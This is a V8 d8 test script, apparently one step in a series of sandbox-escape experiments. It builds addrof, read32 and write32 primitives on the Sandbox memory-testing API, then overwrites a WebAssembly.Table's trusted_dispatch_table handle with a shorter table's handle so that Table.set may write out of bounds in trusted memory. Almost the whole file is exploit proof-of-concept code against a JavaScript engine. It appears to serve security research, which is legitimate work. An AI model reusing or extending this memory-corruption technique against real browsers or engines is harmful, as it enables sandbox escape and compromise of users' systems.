// C21 H21: trusted_dispatch_table length mismatch during WebAssembly.Table.set.
//
// H20 showed call_indirect did not consult the transplanted JS table handle in
// that shape. This variant targets the direct consumer:
// WasmTableObject::SetFunctionTableEntry() reads table->trusted_dispatch_table()
// and updates entry_index. If the handle points to a shorter dispatch table,
// setting index 1 may become a trusted-table OOB write unless guarded.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kTrustedDispatchTableOffset = 0x1c;
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('f0', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x10, kExprI32Add])
      .exportFunc();
  b.addFunction('f1', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x20, kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

let {f0, f1} = makeTargets();
let big = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
let small = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 1});
big.set(0, f0);
big.set(1, f0);
small.set(0, f0);

let bigAddr = addrof(big);
let smallAddr = addrof(small);
let bigHandle = read32(bigAddr + kTrustedDispatchTableOffset);
let smallHandle = read32(smallAddr + kTrustedDispatchTableOffset);

print(`big_handle=0x${bigHandle.toString(16)}`);
print(`small_handle=0x${smallHandle.toString(16)}`);
print(`before_get1_is_f0=${big.get(1) === f0}`);

write32(bigAddr + kTrustedDispatchTableOffset, smallHandle);

try {
  big.set(1, f1);
  print(`set1_ok=true`);
  print(`after_get1_is_f1=${big.get(1) === f1}`);
} catch (e) {
  print(`set1_throw=${e.name}:${e.message}`);
}

gc();
print('done');
